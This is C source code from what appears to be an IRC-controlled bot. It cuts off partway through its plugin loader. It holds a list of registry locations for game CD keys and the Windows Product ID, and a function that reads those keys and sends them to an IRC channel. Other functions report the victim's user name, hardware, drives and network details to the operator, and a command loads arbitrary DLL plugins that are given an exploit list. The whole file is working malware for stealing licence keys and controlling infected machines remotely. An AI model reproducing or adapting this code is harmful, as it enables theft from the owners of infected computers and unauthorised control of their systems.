#include "includes.h"
#include "externs.h"

REGKEYS regkeys[]={
	{HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", "CDKey", "Counter-Strike (Retail)", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators", "RegNumber", "The Gladiators", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\Valve\\Gunman\\Settings", "Key", "Gunman Chronicles", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", "Key", "Half-Life", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\JoWooD\\InstalledGames\\IG2", "prvkey", "Industry Giant 2", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\3d0\\Status","CustomerNumber", "Legends of Might and Magic", NULL, NULL, FALSE},
	{HKEY_CURRENT_USER, "Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings", "CDKey", "Soldiers Of Anarchy", NULL, NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion", "ProductId", "Microsoft Windows Product ID", NULL, NULL, TRUE},
	{HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2003","CDKey","Unreal Tournament 2003",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Unreal Technology\\Installed Apps\\UT2004","CDKey","Unreal Tournament 2004",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\IGI 2 Retail","CDKey","IGI 2: Covert Strike",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc","","Freedom Force",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc","","Battlefield 1942",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc","","Battlefield 1942 (Road To Rome)",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc","","Battlefield 1942 (Secret Weapons of WWII)",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc","","Battlefield Vietnam",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc","","Black and White",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc","","Command and Conquer: Generals (Zero Hour)",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc","","James Bond 007: Nightfire",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Generals\\ergc","","Command and Conquer: Generals",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc","","Global Operations",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc","","Medal of Honor: Allied Assault",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc","","Medal of Honor: Allied Assault: Breakthrough",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc","","Medal of Honor: Allied Assault: Spearhead",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2","ergc","Need For Speed Hot Pursuit 2",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc","","Need For Speed: Underground",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc","","Shogun: Total War: Warlord Edition",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc","","FIFA 2002",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc","","FIFA 2003",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc","","NHL 2002",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc","","NHL 2003",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc","","Nascar Racing 2002",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc","","Nascar Racing 2003",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Red Storm Entertainment\\RAVENSHIELD","CDKey","Rainbow Six III RavenShield",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Westwood\\Tiberian Sun","Serial","Command and Conquer: Tiberian Sun",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Westwood\\Red Alert", "Serial","Command and Conquer: Red Alert",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Westwood\\Red Alert 2", "Serial","Command and Conquer: Red Alert 2",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Westwood\\NOX","Serial","NOX",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Techland\\Chrome", "SerialNumber","Chrome",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Illusion Softworks\\Hidden & Dangerous 2","key","Hidden & Dangerous 2",NULL,NULL, FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix","InstallPath","Soldier of Fortune II - Double Helix","base\\mp\\sof2key","mtkwftmkemfew3p3b7", FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", "Location","Neverwinter Nights","nwncdkey.ini","Key1=", FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", "Location","Neverwinter Nights (Shadows of Undrentide)","nwncdkey.ini","Key2=", FALSE},
	{HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter", "Location","Neverwinter Nights (Hordes of the Underdark)","nwncdkey.ini","Key3=", FALSE},
	{NULL, NULL, NULL, NULL, NULL, NULL, FALSE}
};

bool XGetSystemInfo(SESSION* Session)
{
	char *ComputerName = (char *)XHeapAlloc(256);
	char *UserName = (char *)XHeapAlloc(256);

	unsigned long b_comp_size = 256;
	unsigned long b_user_size = 256;
 
	if (gethostname(ComputerName, 256) == SOCKET_ERROR)
		if (!GetComputerName(ComputerName, &b_comp_size))
			ComputerName = "???";

	#ifdef DEBUG_SYSTEM
	dbg(ComputerName);
	#endif

	if (!GetUserName(UserName, &b_user_size))
		UserName = "???";

	#ifdef DEBUG_SYSTEM
	dbg(UserName);
	#endif

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Current User:%s", UserName))
	{
		XHeapFree(ComputerName);
		XHeapFree(UserName);
		return false;
	}

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Computer Name:%s", ComputerName))
	{
		XHeapFree(ComputerName);
		XHeapFree(UserName);
		return false;
	}

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Windows Directory:%s", MainStruct.WindowsDirectory))
	{
		XHeapFree(ComputerName);
		XHeapFree(UserName);
		return false;
	}

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "System Directory:%s", MainStruct.SystemDirectory))
	{
		XHeapFree(ComputerName);
		XHeapFree(UserName);
		return false;
	}

	XHeapFree(ComputerName);
	XHeapFree(UserName);

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "CPU:%dMhz", cpuspeed()))
		return false;

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	MEMORYSTATUS memstat;
	GlobalMemoryStatus(&memstat);

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Physical Memory:"))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Total:%d%%, %dmb, %dkb", 100, (memstat.dwTotalPhys / 1048576)+1,memstat.dwTotalPhys / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Used:%d%%, %dmb, %dkb", memstat.dwMemoryLoad, ((memstat.dwTotalPhys - memstat.dwAvailPhys) / 1048576)+1, (memstat.dwTotalPhys - memstat.dwAvailPhys) / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Free:%d%% %dmb, %dkb", 100-memstat.dwMemoryLoad, (memstat.dwAvailPhys / 1048576)+1, memstat.dwAvailPhys / 1024))
		return false;

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Virtual Memory:"))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Total:%dmb, %dkb", (memstat.dwTotalVirtual / 1048576)+1,memstat.dwTotalVirtual / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Used:%dmb, %dkb", ((memstat.dwTotalVirtual - memstat.dwAvailVirtual) / 1048576)+1, (memstat.dwTotalVirtual - memstat.dwAvailVirtual) / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Free:%dmb, %dkb", (memstat.dwAvailVirtual / 1048576)+1, memstat.dwAvailVirtual / 1024))
		return false;

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Paging File:"))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Total:%dmb, %dkb",(memstat.dwTotalPageFile / 1048576)+1,memstat.dwTotalPageFile / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Used:%dmb, %dkb", ((memstat.dwTotalPageFile - memstat.dwAvailPageFile) / 1048576)+1, (memstat.dwTotalPageFile - memstat.dwAvailPageFile) / 1024))
		return false;

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Free:%dmb, %dkb", (memstat.dwAvailPageFile / 1048576)+1, memstat.dwAvailPageFile / 1024))
		return false;

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	OSVERSIONINFO verinfo;

	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&verinfo);

	char *os;

	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0)
	{
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS)
			os = "95";
		else if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT)
			os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10)
		os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90)
		os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0)
		os = "2K";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1)
		os = "XP";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 2)
		os = "2003";
	else os = "UNKNOWN";

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Operating System:%s %s %s (%d.%d, Build: %d)", "Windows", os, verinfo.szCSDVersion, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber))
		return false;


	LANGID langid = 0;
	char lang[512];



	langid = GetSystemDefaultLangID();
	/*
	http://www.microsoft.com/globaldev/reference/oslocversion.mspx
	*/

	if (langid == 1025)
		strcpy(lang,"Arabic");
	else if (langid == 1046)
		strcpy(lang,"Brazilian");
	else if (langid == 2052)
		strcpy(lang,"Chinese (Simplified)");
	else if (langid == 1028)
		strcpy(lang,"Chinese (Traditional)");
	else if (langid == 3076)
		strcpy(lang,"Chinese (Hong Kong)");
	else if (langid == 1029)
		strcpy(lang,"Czech");
	else if (langid == 1030)
		strcpy(lang,"Danish");
	else if (langid == 1043)
		strcpy(lang,"Dutch");
	else if (langid == 1033)
		strcpy(lang,"English");
	else if (langid == 1035)
		strcpy(lang,"Finnish");
	else if (langid == 1036)
		strcpy(lang,"French");
	else if (langid == 1031)
		strcpy(lang,"German");
	else if (langid == 1032)
		strcpy(lang,"Greek");
	else if (langid == 1037)
		strcpy(lang,"Hebrew");
	else if (langid == 1038)
		strcpy(lang,"Hungarian");
	else if (langid == 1040)
		strcpy(lang,"Italian");
	else if (langid == 1041)
		strcpy(lang,"Japanese");
	else if (langid == 1042)
		strcpy(lang,"Korean");
	else if (langid == 1044)
		strcpy(lang,"Norwegian");
	else if (langid == 1045)
		strcpy(lang,"Polish");
	else if (langid == 1050)
		strcpy(lang,"Croatian");
	else if (langid == 1061)
		strcpy(lang,"Estonian");
	else if (langid == 2055)
		strcpy(lang,"German (Swiss)");
	else if (langid == 2057)
		strcpy(lang,"English (United Kingdom)");
	else if (langid == 2058)
		strcpy(lang,"Spanish (Mexican)");
	else if (langid == 2060)
		strcpy(lang,"French (Belgian)");
	else if (langid == 2070)
		strcpy(lang,"Portuguese");
	else if (langid == 1049)
		strcpy(lang,"Russian");
	else if (langid == 3073)
		strcpy(lang,"Arabic (Egypt)");
	else if (langid == 4105)
		strcpy(lang,"English (Canadian)");
	else if (langid == 3082)
		strcpy(lang,"Spanish");
	else if (langid == 1053)
		strcpy(lang,"Swedish");
	else if (langid == 1055)
		strcpy(lang,"Turkish");
	else sprintf(lang, "Unknown, ID: %d", langid);

	if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "System Language:%s", lang))
		return false;

//	XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "");

	XDriveInfo(Session, NULL);

	return true;
}

bool XGetNetworkInfo(SESSION* Session, char *Type)
{

	if (Type && !strcmpi(Type, "ADV"))
	{
	//	printf("bzzz\r\n");
		char buffer[128] = {0};
		PIP_ADAPTER_INFO pAdapterInfo;
		PIP_ADAPTER_INFO pAdapter = 0;
		DWORD dwSize = 0,dwRetVal = 0;
		int Time1 = 0,Time2 = 0,Elapsed = 0;
		double Downstream1 = 0,Upstream1 = 0, Downstream2 = 0, Upstream2 = 0;
		PMIB_IFTABLE ifTable;
		PMIB_IFROW pMibIfRow;

		ifTable = (MIB_IFTABLE*)malloc(sizeof(MIB_IFTABLE));
		pMibIfRow = (MIB_IFROW*)malloc(sizeof(MIB_IFROW));
		pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
		unsigned long ulOutBufLen = sizeof(IP_ADAPTER_INFO);

		if (GetIfTable(ifTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER)
		{
			GlobalFree(ifTable);
			ifTable = (MIB_IFTABLE *)malloc(dwSize);
		}

		if (GetAdaptersInfo( pAdapterInfo, &ulOutBufLen) != ERROR_SUCCESS)
		{
			GlobalFree(pAdapterInfo);
			pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
		}

		if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
			pAdapter = pAdapterInfo;

		for (unsigned int i=0; i < ifTable->dwNumEntries; i++)
		{
			if ((dwRetVal = GetIfTable(ifTable, &dwSize, 0)) == NO_ERROR)
			{
				Downstream1 = 0,Upstream1 = 0, Downstream2 = 0, Upstream2 = 0,Elapsed = 0;

				MIB_IFROW Row = ifTable->table[i];
				Downstream1 = (Row.dwInOctets)/(1024.0);
				Upstream1 = (Row.dwOutOctets)/(1024.0);
				Time1 = GetTickCount();

				Sleep(1000);

				MIB_IFROW Row2 = ifTable->table[i];
				if ((dwRetVal = GetIfTable(ifTable, &dwSize, 0)) == NO_ERROR)
					Row2 = ifTable->table[i];
				else
				{
					free(ifTable);
					free(pMibIfRow);
					free(pAdapterInfo);
					return false;
				}

				Downstream2 = (Row2.dwInOctets)/(1024.0);
				Upstream2 = (Row2.dwOutOctets)/(1024.0);
				Time2 = GetTickCount();
				Elapsed = (Time2 - Time1)/(1000);

				if (ifTable->dwNumEntries > 0)
				{
					pMibIfRow->dwIndex = 1;
					if ((dwRetVal = GetIfEntry(pMibIfRow)) == NO_ERROR)
					{
						memset(buffer, 0, sizeof(buffer));
						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Network Card: %s", Row.bDescr))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if(Row.dwType == MIB_IF_TYPE_ETHERNET)
							strncpy(buffer, "Ethernet", sizeof(buffer));
						else if (Row.dwType == MIB_IF_TYPE_PPP)
							strncpy(buffer, "PPP", sizeof(buffer));
						else if (Row.dwType == MIB_IF_TYPE_SLIP)
							strncpy(buffer, "SLIP", sizeof(buffer));
						else if (Row.dwType == MIB_IF_TYPE_TOKENRING)
							strncpy(buffer, "Token Ring", sizeof(buffer));
						else if (Row.dwType == MIB_IF_TYPE_FDDI)
							strncpy(buffer, "FDDI", sizeof(buffer));
						else if (Row.dwType == MIB_IF_TYPE_OTHER)
							strncpy(buffer, "Other", sizeof(buffer));
						else strncpy(buffer, "Unknown", sizeof(buffer));

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Type: %s", buffer))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						memset(buffer, 0, sizeof(buffer));

						if (Row.dwOperStatus == MIB_IF_OPER_STATUS_NON_OPERATIONAL)
						 strncpy(buffer, "LAN - Disabled", sizeof(buffer));
						else if (Row.dwOperStatus == MIB_IF_OPER_STATUS_UNREACHABLE)
						 strncpy(buffer, "WAN - Disconnected", sizeof(buffer));
						else if (Row.dwOperStatus == MIB_IF_OPER_STATUS_DISCONNECTED)
						 strncpy(buffer, "LAN - Disconnected", sizeof(buffer));
						else if (Row.dwOperStatus == MIB_IF_OPER_STATUS_CONNECTING)
						 strncpy(buffer, "LAN - Connecting", sizeof(buffer));
						else if(Row.dwOperStatus == MIB_IF_OPER_STATUS_CONNECTED)
						 strncpy(buffer, "WAN - Connected", sizeof(buffer));
						else if(Row.dwOperStatus == MIB_IF_OPER_STATUS_OPERATIONAL)
						 strncpy(buffer, "LAN - Operational", sizeof(buffer));
						else strncpy(buffer, "Unknown", sizeof(buffer));

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Status: %s", buffer))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						memset(buffer, 0, sizeof(buffer));

						if (!pAdapter)
							strncpy(buffer, "N/A", sizeof(buffer));
						else
							strncpy(buffer, pAdapter->IpAddressList.IpAddress.String, sizeof(buffer));

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "IP Address: %s", buffer))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						memset(buffer, 0, sizeof(buffer));

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Link Speed: %.2f (mb/s)", Row.dwSpeed/(1000.0 * 1000.0)))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "MTU: %d", Row.dwMtu))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Received: %s", XConvertSize(Row2.dwInOctets)))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Sent: %s", XConvertSize(Row2.dwOutOctets)))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Current Downstream: %.2f (kb/s)", (Downstream2 - Downstream1)/(Elapsed)))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Current Upstream: %.2f (kb/s)", (Upstream2 - Upstream1)/(Elapsed)))
						{
							free(ifTable);
							free(pMibIfRow);
							free(pAdapterInfo);

							return false;
						}

						if (pAdapter)
							pAdapter = pAdapter->Next;
					}
				}
			}
		}

		free(ifTable);
		free(pMibIfRow);
		free(pAdapterInfo);

		return true;
	}
	else// if (Type && !strcmpi(Type, "SPECIAL"))
	{
		char *IP;

		for (int i = 0;;i++)
		{
			IP = XGetIP(i);
			if (!IP)
				break;
			else if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%d. %s", i, IP))
					return false;
		}
		return true;
	}

	return false;
}

bool XDriveInfo(SESSION* Session, char *Drive)
{

		DWORD dwSize = GetLogicalDriveStrings(0, NULL);
		LPSTR pszDrives = (LPSTR)XHeapAlloc(dwSize + 2);
		GetLogicalDriveStrings(dwSize + 2,(LPSTR)pszDrives);

		char *pszDrv = pszDrives;
		while (*pszDrv)
		{
			if (!strcmpi(pszDrv, "A:\\") || !strcmpi(pszDrv, "B:\\"))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s Drive ( %s )", XGetDriveType(pszDrv), pszDrv);

				pszDrv += strlen (pszDrv) + 1;

				continue;
			}
		//	printf("access: %s::%i\r\n\n", pszDrv,_access(pszDrv, 4));
		//	system("pause");


		//	char buffer[DATA_BUFFER] = {0};


			DKSPKB dkspkb;

			DKSP dksp;
			dksp.AvailableBytes=-1;
			dksp.FreeBytes=-1;
			dksp.TotalBytes=-1;

				GetDiskFreeSpaceEx(pszDrv,(PULARGE_INTEGER)&dksp.AvailableBytes,(PULARGE_INTEGER)&dksp.TotalBytes,(PULARGE_INTEGER)&dksp.FreeBytes);

			if (dksp.AvailableBytes == -1 || dksp.FreeBytes == -1 || dksp.TotalBytes == -1)
			{
				sprintf(dkspkb.AvailableKB, "failed");
				sprintf(dkspkb.FreeKB, "failed");
				sprintf(dkspkb.TotalKB, "failed");
				dkspkb.iFreeKB = 0;
				dkspkb.iTotalKB = 0;
			}
			else
			{
				_snprintf(dkspkb.AvailableKB, sizeof(dkspkb.AvailableKB), "%sKB",xcommaI64(dksp.AvailableBytes/1024));
				_snprintf(dkspkb.FreeKB, sizeof(dkspkb.FreeKB), "%sKB",xcommaI64(dksp.FreeBytes/1024));
				dkspkb.iFreeKB = (dksp.FreeBytes/1024);

				_snprintf(dkspkb.TotalKB, sizeof(dkspkb.TotalKB), "%sKB",xcommaI64(dksp.TotalBytes/1024));		
				dkspkb.iTotalKB = (dksp.TotalBytes/1024);
			}
			
			if (!strcmp(dkspkb.TotalKB, "failed"))
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s Drive ( %s ): Failed to stat, Device not ready!", XGetDriveType(pszDrv), pszDrv);
			else
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%s Drive ( %s ): %s Total, %s Free, %s Available!", XGetDriveType(pszDrv), pszDrv, dkspkb.TotalKB, dkspkb.FreeKB, dkspkb.AvailableKB);

			

				
		pszDrv += strlen (pszDrv) + 1;
		
	}
	XHeapFree(pszDrives);

	return true;
}
bool XGetCDKeys(SESSION* Session, char *All)
{
	char line[128] = {0}, Path[MAX_PATH] = {0};
	unsigned char buffer[128] = {0}; 

	FILE *fp;
	HKEY hkey;
	LONG lRet;
	DWORD dwSize = 128;

	for (unsigned int i = 0; regkeys[i].Subkey; i++)
	{
		if ((regkeys[i].OnlyAdv && All) || !regkeys[i].OnlyAdv)
		{
			lRet = RegOpenKeyEx(regkeys[i].hkey, regkeys[i].Subkey, 0, KEY_READ, &hkey);
			if (RegQueryValueEx(hkey, regkeys[i].Value, NULL, NULL, buffer, &dwSize) == ERROR_SUCCESS)
			{
				if (regkeys[i].File)
				{
					_snprintf(Path, sizeof(Path), "%s\\%s", buffer, regkeys[i].File);
					if ((fp=fopen(Path,"r")))
					{ 
						while (fgets(line, sizeof(line), fp))
						{
							if (!strstr(line, regkeys[i].tag))
							{
								if (strchr(regkeys[i].tag, '='))
								{
									strtok(line, "=");
									if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Found %s CD Key: %s", regkeys[i].Name, strtok(NULL, "=")))
									{
										RegCloseKey(hkey);
										fclose(fp); 
										return false;
									}

								}
								else if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Found %s CD Key: %s", regkeys[i].Name, line))
								{
									RegCloseKey(hkey);
									fclose(fp); 
									return false;
								}
								break;
							}
						}
						fclose(fp); 
					}
				}
				else
				{
					if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Found %s CD Key: %s", regkeys[i].Name, buffer))
					{
						RegCloseKey(hkey);
						return false;
					}
				}
			}
			RegCloseKey(hkey);
		}
	}
  
	return true;
}

bool XPluginControl(SESSION* Session, char *Type, char *ID, char *Param0, char  *Param1, char  *Param2, char  *Param3, char  *Param4, char  *Param5, char  *Param6, char  *Param7, char  *Param8, char  *Param9)
{
	if (!Type)
	{
		XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[Plugins]");

		for (int x = 1; x < MAXPLUGINS; x++)
		{
			if (plugins[x].xPlugin && plugins[x].Name[0])
				if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%d. Name: %s", x, plugins[x].Name))
					return false;
		}

		return true;
	}
	else
	{
		if (!strcmpi(Type, "LIST"))
		{
			XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "[Plugins]");

			for (int x = 1; x < MAXPLUGINS; x++)
			{
				if (plugins[x].xPlugin && plugins[x].Name[0])
					if (!XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "%d. Name: %s", x, plugins[x].Name))
						return false;
			}

			return true;
		}
		else if (!strcmpi(Type, "LOAD"))
		{
			if (!ID)
				return false;

			DWORD status = GetFileAttributes(ID);

			if (status == -1 || (status & FILE_ATTRIBUTE_DIRECTORY))
			{
				XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "No such file!");
				return false;
			}

			for (int x = 1; x < MAXPLUGINS; x++)
			{
				if (!plugins[x].xPlugin)
				{
					plugins[x].xPlugin = LoadLibrary(ID);
					if (!plugins[x].xPlugin)
					{
						return false;
					}

					plugins[x].xInfo = (XINFO)GetProcAddress(plugins[x].xPlugin, "xInfo");
					if (!plugins[x].xInfo)
					{


						return false;
					}

					plugins[x].xStart = (XSTART)GetProcAddress(plugins[x].xPlugin, "xStart");
					if (!plugins[x].xStart)
					{


						return false;
					}

					plugins[x].xMain = (XMAIN)GetProcAddress(plugins[x].xPlugin, "xMain");
					if (!plugins[x].xMain)
					{

						return false;
					}


						plugins[x].xInfo(NULL, NULL, NULL, NULL, NULL, &plugins[x].xPluginSignature, &plugins[x].xPluginVersion);


					char *buffer;

						buffer = plugins[x].xInfo(&MainStruct, &ExploitList, &threads, &plugins, Session, &plugins[x].xPluginSignature, &plugins[x].xPluginVersion);
					

					if (!buffer)
					{
						return false;
					}
					else
					{
						for (int p = 1; p < MAXPLUGINS; p++)
						{
							if (plugins[p].xPluginSignature == plugins[x].xPluginSignature)
							{
								if (strcmp(plugins[p].Name, plugins[x].Name))
								{;

									XIRCMessage(Session->irc->sock, TRUE, Session->Notice, Session->Silent, Session->Destination, "Already loaded, Plugin ID: ( %d ) Name: ( %s )", p, plugins[p].Name);

									return false;
								}
							}
						}
						strncpy(plugins[x].Name, buffer, sizeof(plugins[x].Name)-1);
					}


